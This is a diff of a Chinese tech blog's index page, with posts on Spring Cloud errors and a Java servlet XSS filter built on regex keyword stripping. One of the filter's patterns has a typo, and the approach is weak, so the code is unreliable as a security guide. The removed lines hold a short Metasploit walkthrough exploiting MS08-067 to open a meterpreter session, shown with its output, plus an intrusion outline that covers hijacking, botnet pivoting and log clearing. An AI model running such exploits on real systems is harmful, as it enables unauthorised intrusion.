@@ -378,7 +378,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.wuxinvip.com/2018/03/24/technical-summary/technical-summary-4/">
+    <link itemprop="mainEntityOfPage" href="http://www.wuxinvip.com/2018/03/24/spring-cloud-exception/feign-exception-1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="无心">
@@ -397,8 +397,8 @@
         
           <h2 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/03/24/technical-summary/technical-summary-4/" itemprop="url">
-                  高并发
+                <a class="post-title-link" href="/2018/03/24/spring-cloud-exception/feign-exception-1/" itemprop="url">
+                  cloud feign灵异事件
                 </a>
               
             
@@ -478,9 +478,12 @@
       
         
           
-            <p>分布式，服务SOA，集群</p>
-<p>建个好的表结构，降低业余逻辑代码量，因为多一行代码，多一份危险，简单到极致的增删改最最能抗住高并发的</p>
-<p>申明:spring cloud 1.0 就经过了千万级别用户洗礼才发布的</p>
+            <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">报错 ：</span><br><span class="line">Exception encountered during context initialization - cancelling refresh attempt: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name &apos;dataSourceInitializerPostProcessor&apos;: Unsatisfied dependency expressed through field &apos;beanFactory&apos;; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name &apos;com.****.feign.UserCenterFeignService&apos;: Lookup method resolution failed; nested exception is java.lang.IllegalStateException: Failed to introspect Class [org.springframework.cloud.netflix.feign.FeignClientFactoryBean] from ClassLoader [sun.misc.Launcher$AppClassLoader@61e4705b]</span><br></pre></td></tr></table></figure>
+<p><img src="http://upload-images.jianshu.io/upload_images/6434888-7df99f9e93f72b12.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>解决办法 加入依赖</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/6434888-c71a9b346663d6f5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原因未明 、创建项目时候导入了feign</span><br><span class="line">使用@EnableFeignClients注解 也ok 不报错 我就以为 feign包导入了  </span><br><span class="line">结果不知道哪来的包来的这个注解  导致 灵异事件</span><br><span class="line">`</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/6434888-55ccd9dddc1f19e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">严重怀疑是这个包里的</span><br><span class="line"></span><br><span class="line">mmp  莫名其妙的好了 仿佛又回到从前</span><br><span class="line">你对java 一无所知......</span><br></pre></td></tr></table></figure>
 
           
         
@@ -496,28 +499,35 @@
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/technical-summary/technical-summary-0/" rel="bookmark">技术发展</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/spring-cloud/spring-cloud-1/" rel="bookmark">spring cloud 总 架构图</a></div>
       
     </li>
   
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/technical-summary/technical-summary-1/" rel="bookmark">一个HTTP请求究竟发生了什么</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/spring-cloud/Hystrix/" rel="bookmark">Hystrix</a></div>
       
     </li>
   
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/technical-summary/technical-summary-2/" rel="bookmark">技术负责人应有的几项要求</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/spring-cloud/reactor-core/" rel="bookmark">Reactor Core</a></div>
       
     </li>
   
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/technical-summary/technical-summary-3/" rel="bookmark">总结</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/spring-cloud/ribbon/" rel="bookmark">Ribbon</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/spring-cloud/feign-1/" rel="bookmark">Feign服务调用</a></div>
       
     </li>
   
@@ -571,7 +581,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.wuxinvip.com/2018/03/24/technical-summary/technical-summary-3/">
+    <link itemprop="mainEntityOfPage" href="http://www.wuxinvip.com/2018/03/24/hack/filter-xss/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="无心">
@@ -590,8 +600,8 @@
         
           <h2 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/03/24/technical-summary/technical-summary-3/" itemprop="url">
-                  总结
+                <a class="post-title-link" href="/2018/03/24/hack/filter-xss/" itemprop="url">
+                  Filter安全过滤高级最终行（XSS攻击）
                 </a>
               
             
@@ -671,28 +681,114 @@
       
         
           
-            <p>梳理一下脑子里的东西按点整理一下</p>
-<p>消息中间件，ActiveMQ.Kafka.ZeroMQ.RabbitMQ.RocketMQ</p>
-<p>服务治理Dubbo.eureka.</p>
-<p>服务网springcloud</p>
-<p>cpu线程</p>
-<p>docker容器</p>
-<p>负载均衡lvs radware nginx keepalived</p>
-<p>端口转发，网卡驱动</p>
-<p>jvm内存 . 堆.栈 规则  一个线程会占用掉多少内存.一个对象会占用多少内存</p>
-<p>javac 编译后文件 字节码文件</p>
-<p>数据库mysql.alisql.oracle (并发.事物.存储过程)</p>
-<p>Nosql.redis.memcached.ecache.mongdb</p>
-<p>算法、负载均衡算法，缓存淘汰算法，排序算法，数据整理算法</p>
-<p>uml设计.部署图，流程图，ER图，时序图。</p>
-<p>搜索引擎</p>
-<p>权限架构</p>
-<p>IO:AIO　BIO  NIO　</p>
-<p>消息流　Netty</p>
-<p>怎么讲呢 今年大脑经历了大量信息的冲击.有些东西可能会很快忘记.留下的只有感悟.经验</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">总结.构建知识体系.</span><br><span class="line"></span><br><span class="line">分流:负载均衡(软硬件).算法(随机.权重.最小调用).</span><br><span class="line">软件:nginx.vortex.radware</span><br><span class="line">硬件:LVS.F5</span><br><span class="line"></span><br><span class="line">缓存: Redis.   Memcached. Mongdb. ehcache</span><br><span class="line">问题:缓存击穿.缓存同步</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">并发.线程.</span><br><span class="line"></span><br><span class="line">数据库:mysql.AliSQL</span><br><span class="line">容量.并发线程.事物提交.存储过程</span><br><span class="line"></span><br><span class="line">java基本功.io.util.sql.</span><br><span class="line"></span><br><span class="line">主流中间件:</span><br><span class="line">RPC:dubbo. eureka</span><br><span class="line">消息中间件rocketmq.rabbitmq.zeromq.</span><br><span class="line"></span><br><span class="line">技术架构:springcloud</span><br><span class="line"></span><br><span class="line">服务架构:SOA</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">渗透:</span><br><span class="line">1.基本工具使用</span><br><span class="line"></span><br><span class="line">比如wifi劫持.https劫持.session劫持.</span><br><span class="line"></span><br><span class="line">1.5.网站探测:whois.钟馗之眼.</span><br><span class="line"></span><br><span class="line">2.跳点搭建.vpn.或者直接控制肉鸡进行跳点</span><br><span class="line"></span><br><span class="line">3.主机扫描.漏洞扫描.关注国家网络安全网发布的漏洞.</span><br><span class="line"></span><br><span class="line">4.脚本攻击.shell脚本 python脚本</span><br><span class="line"></span><br><span class="line">5.日志清除.</span><br></pre></td></tr></table></figure>
-<p>今日起 关注人工智能、进军人工智能。以备将来使用。</p>
+            <p>package com.what21.filter.xss;</p>
+<p>import java.io.IOException;<br>import java.util.LinkedHashMap;<br>import java.util.Map;</p>
+<p>import javax.servlet.Filter;<br>import javax.servlet.FilterChain;<br>import javax.servlet.FilterConfig;<br>import javax.servlet.ServletException;<br>import javax.servlet.ServletRequest;<br>import javax.servlet.ServletResponse;<br>import javax.servlet.http.HttpServletRequest;</p>
+<p>public class XSSFilter implements Filter {</p>
+<pre><code>// XSS处理Map
+private static Map&lt;String,String&gt; xssMap = new LinkedHashMap&lt;String,String&gt;();
+
+public void init(FilterConfig filterConfig) throws ServletException {
+    // 含有脚本： script
+    xssMap.put(&quot;[s|S][c|C][r|R][i|C][p|P][t|T]&quot;, &quot;&quot;);
+    // 含有脚本 javascript
+    xssMap.put(&quot;[\\\&quot;\\\&apos;][\\s]*[j|J][a|A][v|V][a|A][s|S][c|C][r|R][i|I][p|P][t|T]:(.*)[\\\&quot;\\\&apos;]&quot;, &quot;\&quot;\&quot;&quot;);
+    // 含有函数： eval
+    xssMap.put(&quot;[e|E][v|V][a|A][l|L]\\((.*)\\)&quot;, &quot;&quot;);
+    // 含有符号 &lt;
+    xssMap.put(&quot;&lt;&quot;, &quot;&amp;lt;&quot;);
+    // 含有符号 &gt;
+    xssMap.put(&quot;&gt;&quot;, &quot;&amp;gt;&quot;);
+    // 含有符号 (
+    xssMap.put(&quot;\\(&quot;, &quot;(&quot;);
+    // 含有符号 )
+    xssMap.put(&quot;\\)&quot;, &quot;)&quot;);
+    // 含有符号 &apos;
+    xssMap.put(&quot;&apos;&quot;, &quot;&apos;&quot;);
+    // 含有符号 &quot;
+    xssMap.put(&quot;\&quot;&quot;, &quot;\&quot;&quot;);
+}
+
+public void doFilter(ServletRequest request, ServletResponse response,
+        FilterChain chain) throws IOException, ServletException {
+    // 强制类型转换 HttpServletRequest
+    HttpServletRequest httpReq = (HttpServletRequest)request;
+    // 构造HttpRequestWrapper对象处理XSS
+    HttpRequestWrapper httpReqWarp = new HttpRequestWrapper(httpReq,xssMap);
+    //
+    chain.doFilter(httpReqWarp, response);
+
+}
+
+public void destroy() {
+
+}
+</code></pre><p>}</p>
+<p>=============================<br>package com.what21.filter.xss;</p>
+<p>import java.util.Map;<br>import java.util.Set;</p>
+<p>import javax.servlet.http.HttpServletRequest;<br>import javax.servlet.http.HttpServletRequestWrapper;</p>
+<p>public final class HttpRequestWrapper extends HttpServletRequestWrapper {</p>
+<pre><code>private Map&lt;String, String&gt; xssMap;
+
+public HttpRequestWrapper(HttpServletRequest request) {
+    super(request);
+}
+
+public HttpRequestWrapper(HttpServletRequest request,
+        Map&lt;String, String&gt; xssMap) {
+    super(request);
+    this.xssMap = xssMap;
+}
+
+@Override
+public String[] getParameterValues(String parameter) {
+    String[] values = super.getParameterValues(parameter);
+    if (values == null) {
+        return null;
+    }
+    int count = values.length;
+    // 遍历每一个参数，检查是否含有
+    String[] encodedValues = new String[count];
+    for (int i = 0; i &lt; count; i++) {
+        encodedValues[i] = cleanXSS(values[i]);
+    }
+    return encodedValues;
+}
+
+@Override
+public String getParameter(String parameter) {
+    String value = super.getParameter(parameter);
+    if (value == null) {
+        return null;
+    }
+    return cleanXSS(value);
+}
+
+public String getHeader(String name) {
+    String value = super.getHeader(name);
+    if (value == null)
+        return null;
+    return cleanXSS(value);
+
+}
+</code></pre><p>/**</p>
+<pre><code> * 清除恶意的XSS脚本
+ *
+ * @param value
+ * @return
+ */
+private String cleanXSS(String value) {
+    Set&lt;String&gt; keySet = xssMap.keySet();
+    for(String key : keySet){
+        String v = xssMap.get(key);
+        value = value.replaceAll(key,v);
+    }
+    return value;
+}
+</code></pre><p>}</p>
+<p>=============================================================================</p>
+<p><filter><br>    <filter-name>XSSFilter</filter-name><br>    <filter-class>com.what21.filter.xss.XSSFilter</filter-class><br></filter></p>
+<p><filter-mapping><br>    <filter-name>XSSFilter</filter-name><br>    <url-pattern>/*</url-pattern><br></filter-mapping></p>
 
           
         
@@ -708,195 +804,9 @@
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/technical-summary/technical-summary-0/" rel="bookmark">技术发展</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/hack/about-hack/" rel="bookmark">关于漏洞和攻击</a></div>
       
     </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/technical-summary/technical-summary-1/" rel="bookmark">一个HTTP请求究竟发生了什么</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/technical-summary/technical-summary-2/" rel="bookmark">技术负责人应有的几项要求</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/technical-summary/technical-summary-4/" rel="bookmark">高并发</a></div>
-      
-    </li>
-  
-  </ul>
-
-
-    
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.wuxinvip.com/2018/03/24/hack/metasploit-hack-windows/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="无心">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="无心の技术簿">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/03/24/hack/metasploit-hack-windows/" itemprop="url">
-                  使用Metasploit入侵windows
-                </a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2018-03-24 08:00:00" itemprop="dateCreated datePublished" datetime="2018-03-24T08:00:00+08:00">2018-03-24</time>
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/java/" itemprop="url" rel="index"><span itemprop="name">java</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body han-init-context" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>使用msfconsole 查看window发布的漏洞</p>
-<p>运气好的话 你要破解的windows没有打补丁.那么使用该漏洞你就可以直接登陆到windows了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># msfconsole</span><br><span class="line"></span><br><span class="line">msf &gt; search platform: windows xp sp3</span><br><span class="line">msf &gt; search platform: windows 10</span><br><span class="line">msf &gt; search platform: android</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf &gt; info exploit/windows/smb/ms08_067_netapi</span><br><span class="line">使用info查看漏洞信息.</span><br><span class="line"></span><br><span class="line">msf &gt; use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">&gt; set payload windows/meterpreter/bind_tcp</span><br><span class="line">&gt; set RHOST 192.168.0.108  (设置目标主机IP地址)</span><br><span class="line">&gt; exploit</span><br><span class="line">设定攻击方式.攻击ip</span><br><span class="line"></span><br><span class="line">攻击成功:</span><br><span class="line">[*] Started bind handler</span><br><span class="line">[*] Automatically detecting the target...</span><br><span class="line">[*] Fingerprint: Windows XP SP3 - Service Pack 3 - lang:Chinese</span><br><span class="line">[*] Selected Target: Windows XP SP3 Chinese (AlwaysOn NK)</span><br><span class="line">[*] Attempting to trigger the vulnerability...</span><br><span class="line">[*] Sending stage (751104 bytes) to 192.168.0.108</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.0.1:41614 -&gt; 192.168.0.108:4444) at 2016-04-15 17:29:32</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br><span class="line"></span><br><span class="line">失败就尝试其他漏洞</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-
-    
-      
-
-  <div class="popular-posts-header">相关文章</div>
-  <ul class="popular-posts">
   
     <li class="popular-posts-item">
       
@@ -915,13 +825,6 @@
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/filter-xss/" rel="bookmark">Filter安全过滤高级最终行（XSS攻击）</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
       <div class="popular-posts-title"><a href="/2018/03/24/hack/ssh-violence/" rel="bookmark">ssh远程登陆破解</a></div>
       
     </li>
@@ -929,7 +832,210 @@
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/wifi-violence/" rel="bookmark">wifi破解</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/hack/metasploit-hack-windows/" rel="bookmark">使用Metasploit入侵windows</a></div>
+      
+    </li>
+  
+  </ul>
+
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.wuxinvip.com/2018/03/24/spring-cloud-exception/sleuth-exception-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="无心">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="无心の技术簿">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/03/24/spring-cloud-exception/sleuth-exception-1/" itemprop="url">
+                  sleuth灵异事件
+                </a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-03-24 08:00:00" itemprop="dateCreated datePublished" datetime="2018-03-24T08:00:00+08:00">2018-03-24</time>
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/java/" itemprop="url" rel="index"><span itemprop="name">java</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body han-init-context" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>分布式 服务跟踪系统</p>
+<p>客户端发送ok<br><img src="http://upload-images.jianshu.io/upload_images/6434888-39e03c88f9cbc91d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>server端 启动ok<br>但是就是没有数据</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/6434888-0873f181258771f1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">灵异原因：可能是版本不一致</span><br><span class="line"></span><br><span class="line">要保证 客户端 cloud version</span><br><span class="line">和sleuth server  cloud version 版本一致</span><br><span class="line">修改方式：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">`</span><br></pre></td></tr></table></figure>
+<p><img src="http://upload-images.jianshu.io/upload_images/6434888-332963ea8a515ceb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+
+          
+        
+      
+    </div>
+
+    
+      
+
+  <div class="popular-posts-header">相关文章</div>
+  <ul class="popular-posts">
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/spring-cloud/spring-cloud-1/" rel="bookmark">spring cloud 总 架构图</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/spring-cloud/Hystrix/" rel="bookmark">Hystrix</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/spring-cloud/reactor-core/" rel="bookmark">Reactor Core</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/spring-cloud/ribbon/" rel="bookmark">Ribbon</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/spring-cloud/feign-1/" rel="bookmark">Feign服务调用</a></div>
       
     </li>
   
@@ -1185,6 +1291,16 @@
                 </span>
               
                 <span class="links-of-author-item">
+                  <a href="https://gitee.com/none_heart" target="_blank" title="Gitee" rel="external nofollow"><i class="fa fa-fw fa-github"></i></a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://blog.csdn.net/huoyan403" target="_blank" title="CSDN" rel="external nofollow"><i class="fa fa-fw fa-stack-overflow"></i></a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
                   <a href="mailto:wuxinvipcom@gmail.com" target="_blank" title="E-Mail" rel="external nofollow"><i class="fa fa-fw fa-envelope"></i></a>
                   
                 </span>
@@ -1244,7 +1360,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+        <div class="copyright">&copy; 2017 – <span itemprop="copyrightYear">2018</span>
   <span class="with-love" id="animate">
     <i class="fa fa-user"></i>
   </span>
